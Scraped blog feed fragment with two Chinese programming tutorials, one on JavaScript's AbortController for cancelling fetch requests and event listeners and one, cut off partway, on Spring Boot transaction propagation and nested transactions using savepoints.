li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代 Web 开发中，异步操作（如网络请求、定时器、事件监听）无处不在。然而，如何优雅地终止这些不再需要的异步操作，长期以来一直是前端开发中的一个痛点。</p>
<blockquote>
<p><strong>前排广告位：欢迎访问我的个人网站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fhixiaohezi.com%2F" target="_blank" title="https://hixiaohezi.com/" ref="nofollow noopener noreferrer">hixiaohezi.com</a></strong></p>
</blockquote>
<blockquote>
<p><strong>欢迎关注微信公众号<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FlKcA-cA-vTnobIOX-ecfMA" target="_blank" title="https://mp.weixin.qq.com/s/lKcA-cA-vTnobIOX-ecfMA" ref="nofollow noopener noreferrer">“Hi 小禾子”</a></strong></p>
</blockquote>
<p><code>AbortController</code> 作为一个标准的 Web API，为开发者提供了一种统一、且具备高度扩展性的方式来取消异步任务。</p>
<hr/>
<h3 data-id="heading-0">一、 什么是 AbortController？</h3>
<p><code>AbortController</code> 是一个 DOM 标准定义的接口，旨在提供一种通用的“取消信号”机制。它主要由两个部分组成：</p>
<ol>
<li><strong>控制器（Controller）</strong>：通过实例化 <code>new AbortController()</code> 创建，负责发出取消指令。</li>
<li><strong>信号（Signal）</strong>：位于控制器的 <code>signal</code> 属性中，用于传递取消指令。异步 API（如 <code>fetch</code>）通过接收这个信号来决定何时终止操作。</li>
</ol>
<hr/>
<h3 data-id="heading-1">二、 核心基础：如何使用？</h3>
<p>其工作流程可以类比为“电视机”与“遥控器”：<code>Signal</code> 是电视机接收的无线信号，而 <code>Controller</code> 就是手中的遥控器。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 创建控制器</span>
<span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();
<span class="hljs-keyword">const</span> signal = controller.<span class="hljs-property">signal</span>;

<span class="hljs-comment">// 2. 将信号传递给支持该机制的 API（如 fetch）</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/data'</span>, { signal })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
    <span class="hljs-keyword">if</span> (err.<span class="hljs-property">name</span> === <span class="hljs-string">'AbortError'</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'请求已被手动取消'</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'其他网络错误'</span>, err);
    }
  });

<span class="hljs-comment">// 3. 在需要的时候发出取消指令</span>
<span class="hljs-comment">// 比如用户离开了当前页面，或者点击了“停止运行”按钮</span>
controller.<span class="hljs-title function_">abort</span>();
</code></pre>
<hr/>
<h3 data-id="heading-2">三、 实战场景解析</h3>
<h4 data-id="heading-3">1. 解决网络请求的“竞态限制” (Race Conditions)</h4>
<p>在搜索框搜索时，频繁的输入会触发多次 API 请求。虽然可以通过**防抖（Debounce）<strong>或</strong>节流（Throttle）**减少请求发起的频率，但它们无法解决网络层面的“竞态”问题：</p>
<ul>
<li><strong>防抖/节流的局限</strong>：它们仅控制触发频率。即使请求频率降低了，仍可能出现先发出的请求（由于后端处理慢或网络波动）比后出的请求更晚返回的情况。如果前端直接采用最后返回的结果，就会导致数据显示错乱。</li>
<li><strong>AbortController 的优势</strong>：它直接在网络层撤销不再需要的请求。通过在发起新请求前调用 <code>controller.abort()</code>，可以确保只有最后一次请求的结果被处理，从根本上杜绝了旧数据覆盖新数据的风险。</li>
</ul>
<p><strong>最佳实践建议</strong>：防抖与 <code>AbortController</code> 并不冲突。通常建议将两者结合使用：用防抖节省服务器带宽，用 <code>AbortController</code> 保证前端数据的终态一致性。</p>
<h4 data-id="heading-4">2. 事件监听器的“一键清理”</h4>
<p>在处理复杂的 UI 组件时，通常需要绑定大量的事件监听。手动逐个调用 <code>removeEventListener</code> 不仅繁琐，且容易造成遗漏。</p>
<p>现代浏览器支持将 <code>signal</code> 传入 <code>addEventListener</code> 的配置项中：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();

<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-function">() =&gt;</span> { <span class="hljs-comment">/* 处理逻辑 */</span> }, { <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> });
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-function">() =&gt;</span> { <span class="hljs-comment">/* 处理逻辑 */</span> }, { <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> });

<span class="hljs-comment">// 当组件卸载或任务结束时，一行代码即可清除所有关联的监听器</span>
controller.<span class="hljs-title function_">abort</span>();
</code></pre>
<h4 data-id="heading-5">3. 处理超时逻辑</h4>
<p>利用 <code>AbortSignal.timeout()</code>（较新特性），可以更简洁地实现请求超时机制，而不再需要手动组合 <code>setTimeout</code> 与 <code>Promise</code>。</p>
<hr/>
<h3 data-id="heading-6">四、 实际开发中使用的多吗？</h3>
<p><strong>答案是：越来越多，且已成为标准做法。</strong></p>
<ul>
<li><strong>主流库的兼容性</strong>：著名的网络请求库 <strong>Axios</strong> 在 v0.22.0 之后正式废弃了旧有的 <code>CancelToken</code> 方案，转而全面支持 <code>AbortController</code> 规范。这意味着它已成为 JS 生态中取消异常操作的事实标准。</li>
<li><strong>并发库的支持</strong>：如 <code>React Query</code>、<code>SWR</code> 等流行数据请求方案，其底层均高度依赖该 API 来处理自动重试、请求取消及并发控制。</li>
<li><strong>跨环境一致性</strong>：<code>AbortController</code> 不仅在浏览器环境得到原生支持，在 <strong>Node.js</strong>（v15+）中也已内置，为全栈开发带来了统一的体验。</li>
</ul>
<hr/>
<h3 data-id="heading-7">五、 总结</h3>
<p><code>AbortController</code> 并不只是为取消 <code>fetch</code> 请求而设计的。它的核心价值在于提供了一种<strong>跨库、跨环境、跨 API</strong> 的通用终止协议。</p>
<p>对于追求代码健壮性的开发者而言，掌握这一机制能够更精确地控制资源生命周期，从而避免内存泄漏与逻辑碎片。</p>
<blockquote>
<p><strong>欢迎访问我的个人网站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fhixiaohezi.com%2F" target="_blank" title="https://hixiaohezi.com/" ref="nofollow noopener noreferrer">hixiaohezi.com</a></strong></p>
</blockquote>
<blockquote>
<p><strong>欢迎关注微信公众号<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FlKcA-cA-vTnobIOX-ecfMA" target="_blank" title="https://mp.weixin.qq.com/s/lKcA-cA-vTnobIOX-ecfMA" ref="nofollow noopener noreferrer">“Hi 小禾子”</a></strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2588ddc10c8545a68eefb9f75060e730~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Y-q54ix5ZCD57OW55qE5bCP576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768283822&amp;x-signature=KVmbncQZjSI4kOmdsnAUCGkY834%3D" alt="og-image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[事务管理最全指南：嵌套事务、传播机制与失效场景深度复盘]]></title>    <link>https://juejin.cn/post/7592075359379505204</link>    <guid>https://juejin.cn/post/7592075359379505204</guid>    <pubDate>2026-01-06T07:26:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592075359379505204" data-draft-id="7591882877311467572" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 事务管理最全指南：嵌套事务、传播机制与失效场景深度复盘"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-06T07:26:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="神奇小汤圆"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             事务管理最全指南：嵌套事务、传播机制与失效场景深度复盘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    神奇小汤圆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:26:02.000Z" title="Tue Jan 06 2026 07:26:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">🚀 前言：为什么事务管理如此重要？</h3>
<p>在现代企业级应用开发中，数据一致性是系统的生命线。想象一个电商场景：用户下单购买商品，系统需要同时完成以下操作：</p>
<ul>
<li>🛒 <strong>扣减库存</strong>：商品库存减1</li>
<li>💰 <strong>创建订单</strong>：生成订单记录</li>
<li>💳 <strong>扣款处理</strong>：用户账户余额扣减</li>
<li>📦 <strong>物流信息</strong>：生成物流单号<br/>
如果其中任何一步失败，整个操作都应该回滚，否则就会出现”库存扣了但订单没创建”的严重数据不一致问题。<strong>Spring Boot的事务管理机制</strong>正是为了解决这类问题而设计的。<br/>
🏗️ 一、Spring事务管理基础架构<br/>
1.1 事务管理核心组件架构</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a035e360c0f84a168612285764f7497c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289161&amp;x-signature=j0t5zeS%2BVJMoxbV8WtdgjjOvFvY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-1">1.2 事务管理器体系结构</h3>
<p><strong>核心接口</strong>：<code>PlatformTransactionManager</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">PlatformTransactionManager</span> {
    <span class="hljs-comment">// 根据事务定义获取事务状态</span>
    TransactionStatus <span class="hljs-title function_">getTransaction</span><span class="hljs-params">(TransactionDefinition definition)</span> <span class="hljs-keyword">throws</span> TransactionException;
    
    <span class="hljs-comment">// 提交事务</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">commit</span><span class="hljs-params">(TransactionStatus status)</span> <span class="hljs-keyword">throws</span> TransactionException;
    
    <span class="hljs-comment">// 回滚事务</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">rollback</span><span class="hljs-params">(TransactionStatus status)</span> <span class="hljs-keyword">throws</span> TransactionException;
}
</code></pre>
<p><strong>主要实现类</strong>：</p>






























<table><thead><tr><th>实现类</th><th>应用场景</th><th>特点</th></tr></thead><tbody><tr><td>DataSourceTransactionManager</td><td>JDBC/MyBatis</td><td>单数据源事务管理</td></tr><tr><td>JpaTransactionManager</td><td>JPA/Hibernate</td><td>JPA规范事务管理</td></tr><tr><td>JtaTransactionManager</td><td>JTA分布式事务</td><td>支持多数据源XA事务</td></tr><tr><td>HibernateTransactionManager</td><td>Hibernate原生</td><td>Hibernate框架事务管理</td></tr></tbody></table>
<h2 data-id="heading-2">🔍 二、事务传播机制深度解析</h2>
<h3 data-id="heading-3">2.1 事务传播行为概览</h3>
<p>事务传播行为定义了<strong>多个事务方法相互调用时</strong>，事务如何传播的行为。Spring提供了7种传播行为：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a08a2a3f7d194d3d81674073dec10932~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289161&amp;x-signature=d6W7anz6CAU8e%2FCXM3JZyx%2BHfYY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">2.2 传播行为详细解析</h3>
<h3 data-id="heading-5">2.2.1 REQUIRED（默认传播行为）</h3>
<p><strong>行为描述</strong>：如果当前存在事务，则加入该事务；如果当前没有事务，则创建一个新事务。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRED)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-comment">// 如果调用者有事务，加入；否则创建新事务</span>
        orderDao.save(order);
        inventoryService.deductStock(order.getProductId(), order.getQuantity());
    }
}
</code></pre>
<p><strong>执行流程</strong>：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e06ccedbc404e20a171a4541a2900af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289161&amp;x-signature=mxF4ctRRsiv332WYuPMdpIpyQTo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-6">2.2.2 REQUIRES_NEW（独立新事务）</h3>
<p><strong>行为描述</strong>：总是创建新事务，如果当前存在事务，则将当前事务挂起。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogService</span> {
    
    <span class="hljs-meta">@Transactional</span>(propagation = <span class="hljs-title class_">Propagation</span>.<span class="hljs-property">REQUIRES_NEW</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">saveOperationLog</span>(<span class="hljs-params">OperationLog log</span>) {
        <span class="hljs-comment">// 无论调用者是否有事务，都创建新事务</span>
        logDao.<span class="hljs-title function_">save</span>(log);
    }
}
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">processOrder</span>(<span class="hljs-params">Order order</span>) {
        <span class="hljs-keyword">try</span> {
            orderDao.<span class="hljs-title function_">save</span>(order);
            <span class="hljs-comment">// 日志记录在新事务中执行，不受订单事务影响</span>
            logService.<span class="hljs-title function_">saveOperationLog</span>(<span class="hljs-title function_">createLog</span>(order));
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
            <span class="hljs-comment">// 日志已经在新事务中提交，不会回滚</span>
            <span class="hljs-keyword">throw</span> e;
        }
    }
}
</code></pre>
<p><strong>执行流程</strong>：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f921af482bc8456fbbb1aa111a6e3b5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289161&amp;x-signature=w1AjSWRduY%2Bkle8FEq3ETsHz14Y%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">2.2.3 NESTED（嵌套事务）</h3>
<p><strong>行为描述</strong>：如果当前存在事务，则在嵌套事务内执行；如果没有事务，则创建新事务。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentService</span> {
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processPayment</span><span class="hljs-params">(Payment payment)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 主事务逻辑</span>
            paymentDao.save(payment);
            
            <span class="hljs-comment">// 嵌套事务执行风险控制检查</span>
            riskControlService.checkRisk(payment);
            
        } <span class="hljs-keyword">catch</span> (RiskControlException e) {
            <span class="hljs-comment">// 嵌套事务回滚，但主事务可以继续</span>
            payment.setStatus(PaymentStatus.MANUAL_REVIEW);
            paymentDao.update(payment);
        }
    }
}
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RiskControlService</span> {
    
    <span class="hljs-meta">@Transactional(propagation = Propagation.NESTED)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkRisk</span><span class="hljs-params">(Payment payment)</span> <span class="hljs-keyword">throws</span> RiskControlException {
        <span class="hljs-comment">// 嵌套事务逻辑</span>
        riskRecordDao.save(createRiskRecord(payment));
        
        <span class="hljs-keyword">if</span> (isHighRisk(payment)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RiskControlException</span>(<span class="hljs-string">"High risk detected"</span>);
        }
    }
}
</code></pre>
<p><strong>嵌套事务原理</strong>：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9df21ea9d7754dd08f958a71db8e5088~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289161&amp;x-signature=o%2Fox9HYmEmF%2Bdf%2Fk6y5cffW9FZg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">🔄 三、嵌套事务原理与实战</h2>
<h3 data-id="heading-9">3.1 嵌套事务底层实现机制</h3>
<p>嵌套事务通过<strong>保存点</strong>机制实现，它不是真正的事务嵌套，而是在同一物理事务中设置逻辑回滚点。 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D268571238%26content_type%3DArticle%26match_order%3D1%26q%3D%25E4%25BF%259D%25E5%25AD%2598%25E7%2582%25B9%25E6%259C%25BA%25E5%2588%25B6%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=268571238&amp;content_type=Article&amp;match_order=1&amp;q=%E4%BF%9D%E5%AD%98%E7%82%B9%E6%9C%BA%E5%88%B6&amp;zhida_source=entity" ref="nofollow noopener noreferrer">保存点机制</a></strong>：</p>
<pre><code class="hljs language-ini" lang="ini">// JDBC中的保存点使用示例
Connection <span class="hljs-attr">conn</span> = dataSource.getConnection()<span class="hljs-comment">;</span>
try {
    conn.setAutoCommit(false)<span class="hljs-comment">;</span>
    
    // 主事务操作
    Statement <span class="hljs-attr">stmt1</span> = conn.createStatement()<span class="hljs-comment">;</span>
    stmt1.executeUpdate("INSERT INTO orders ...")<span class="hljs-comment">;</span>
    
    // 设置保存点
    Savepoint <span class="hljs-attr">savepoint</span> = conn.setSavepoint(<span class="hljs-string">"nested_start"</span>)<span class="hljs-comment">;</span>
    
    try {
        // 嵌套事务操作
        Statement <span class="hljs-attr">stmt2</span> = conn.createStatement()<span class="hljs-comment">;</span>
        stmt2.executeUpdate("INSERT INTO risk_records ...")<span class="hljs-comment">;</span>
        
        // 嵌套事务提交（释放保存点）
        conn.releaseSavepoint(savepoint)<span class="hljs-comment">;</span>
        
    } catch (SQLException e) {
        // 嵌套事务回滚（回滚到保存点）
        conn.rollback(savepoint)<span class="hljs-comment">;</span>
    }
    
    // 主事务继续操作
    Statement <span class="hljs-attr">stmt3</span> = conn.createStatement()<span class="hljs-comment">;</span>
    stmt3.executeUpdate("UPDATE payments ...")<span class="hljs-comment">;</span>
    
    conn.commit()<span class="hljs-comment">;</span>
    
} catch (SQLException e) {
    conn.rollback()<span class="hljs-comment">;</span>
}
</code></pre>
<h3 data-id="heading-10">3.2 嵌套事务实战场景</h3>
<h3 data-id="heading-11">场景1：批量导入中的部分回滚</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImportService</span> {
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> ImportResult batchImport(List&lt;ImportData&gt; dataList) {
        ImportResult result = new ImportResult();
        
        <span class="hljs-keyword">for</span> (ImportData <span class="hljs-keyword">data</span> : dataList) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 每条记录在嵌套事务中处理</span>
                importSingleData(<span class="hljs-keyword">data</span>);
                result.incrementSuccess();
            } <span class="hljs-keyword">catch</span> (ImportException e) {
                <span class="hljs-comment">// 单条记录失败不影响其他记录</span>
                result.addFailure(<span class="hljs-keyword">data</span>, e.getMessage());
            }
        }
        
        <span class="hljs-keyword">return</span> result;
    }
    
    <span class="hljs-meta">@Transactional(propagation = Propagation.NESTED)</span>
    <span class="hljs-keyword">public</span> void importSingleData(ImportData <span class="hljs-keyword">data</span>) throws ImportException {
        <span class="hljs-comment">// 数据验证</span>
        <span class="hljs-keyword">if</span> (!validateData(<span class="hljs-keyword">data</span>)) {
            <span class="hljs-keyword">throw</span> new ImportException(<span class="hljs-string">"数据验证失败"</span>);
        }
        
        <span class="hljs-comment">// 保存数据</span>
        dataDao.save(<span class="hljs-keyword">data</span>);
        
        <span class="hljs-comment">// 相关处理</span>
        relatedDataService.processRelated(<span class="hljs-keyword">data</span>);
    }
}
</code></pre>
<p><strong>执行流程分析</strong>：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ad18beb3be0450ea692e12274e88dea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289161&amp;x-signature=KDHWwgabi3XtaqDU4UvWc5xrnsI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">3.3 嵌套事务与REQUIRES_NEW的区别</h3>



































